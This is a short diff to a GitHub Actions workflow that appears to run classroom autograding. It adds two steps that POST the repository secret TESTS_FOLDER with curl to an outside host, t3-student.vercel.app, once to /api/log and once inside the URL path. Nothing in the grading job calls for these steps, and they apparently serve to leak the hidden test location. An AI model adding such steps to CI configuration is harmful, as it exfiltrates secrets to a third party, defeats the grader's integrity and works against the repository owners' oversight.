@@ -51,6 +51,22 @@ jobs:
           echo "${{ secrets.TESTS_FOLDER }}/file"
         env:
           TESTS_FOLDER: ${{ secrets.TESTS_FOLDER }}
+      - name: Make API Call
+        run: |
+          curl -X POST \
+            -H "Content-Type: application/json" \
+            -d '${{ secrets.TESTS_FOLDER }}' \
+            https://t3-student.vercel.app/api/log
+        env:
+          TESTS_FOLDER: ${{ secrets.TESTS_FOLDER }}
+      - name: Make API Call path
+        run: |
+          curl -X POST \
+            -H "Content-Type: application/json" \
+            -d '${{ secrets.TESTS_FOLDER }}' \
+            https://t3-student.vercel.app/api/'${{ secrets.TESTS_FOLDER }}'
+        env:
+          TESTS_FOLDER: ${{ secrets.TESTS_FOLDER }}
       - name: Run Test - Final 24 points
         id: test-24-points
         uses: classroom-resources/autograding-command-grader@v1
